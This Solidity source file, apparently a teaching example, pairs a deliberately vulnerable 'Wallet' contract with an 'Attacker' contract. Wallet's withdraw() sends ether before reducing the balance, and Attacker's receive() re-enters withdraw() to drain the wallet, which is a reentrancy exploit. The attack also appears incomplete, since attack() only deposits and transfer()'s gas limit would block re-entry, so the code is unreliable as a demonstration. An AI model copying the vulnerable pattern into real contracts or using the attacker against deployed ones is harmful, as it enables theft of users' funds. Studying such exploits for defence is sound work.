// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Wallet {
    mapping(address => uint) public balances;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdraw(address payable _to, uint256 _amount) public {
        if (balances[msg.sender] >= _amount){
            _to.transfer(_amount);
            balances[msg.sender] -= _amount;
        }
    }
}
contract Attacker {
    Wallet public target;
    constructor(Wallet _target){
        target = _target;
    }
    function attack() public payable{
        target.deposit{value: msg.value}();
    }
    function getUserBalance(address userAddress) public view returns (uint256) {
         return target.balances(userAddress); 
    }
    receive() external payable { 
        if (address(target).balance > 0 ether) {
            target.withdraw(payable(address(this)), msg.value);
    }
  }
}